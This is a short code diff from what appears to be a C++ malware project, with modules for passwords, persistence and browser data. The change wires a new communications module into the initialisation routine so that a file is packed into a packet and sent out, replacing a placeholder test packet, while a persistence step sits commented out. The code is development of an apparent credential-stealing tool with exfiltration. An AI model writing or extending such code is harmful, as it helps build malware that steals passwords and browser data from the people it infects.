@@ -16,18 +16,20 @@
 #include "../../include/modules/passwords/passwords.hpp"
 #include "../../include/persistance/persistance.hpp"
 #include "../../include/util/serialization.hpp"
+#include "../../include/communication/comms.hpp"
 
 void initialize::init(char* argv) {
     /*persistance* persist = new persistance(argv);
     persist->persist(argv);
     delete persist;*/
 
-    util::Packet packet;
-    util::File file;
-    file.buffer = (char*) "Du Knecht";
-    file.size = 10;
-    packet.file = file;
-    packet.name = "Knecht";
+    util::Packet *packet = new util::Packet;
+    util::File *file = util::getFile(argv);
+    packet->file = *file;
+
+    comms* com = new comms();
+    com->send_c(*packet);
+
 
 
     browser* bro = new browser();
